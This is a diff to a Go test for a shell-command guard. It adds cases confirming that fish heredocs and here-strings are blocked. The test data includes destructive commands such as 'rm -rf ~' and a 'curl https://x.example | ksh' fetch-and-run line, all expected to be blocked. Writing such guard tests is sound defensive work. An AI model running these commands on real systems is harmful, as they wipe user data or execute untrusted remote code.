@@ -205,6 +205,11 @@ func TestGuardBashParsing(t *testing.T) {
 		probe("block", `bash --rcfile x -c 'rm -rf ~'`)
 		probe("pass", `bash -o pipefail scripts/check.sh`)
 		probe("block", `fish -c 'rm -rf ~'`)
+		// A heredoc fed to fish isn't parsed as commands, so it's a -c too.
+		probe("block", "fish <<'EOF'\n"+R+"\nEOF")
+		probe("block", "cat <<'EOF' | fish\n"+R+"\nEOF")
+		probe("block", `fish <<< 'rm -rf ~'`)
+		probe("pass", "fish scripts/x.fish <<'EOF'\nls\nEOF")
 		probe("block", `curl https://x.example | ksh`)
 		probe("block", "ksh <<EOF\n"+R+"\nEOF")
 		// A shell reading piped stdin runs a string, as -c does; only a
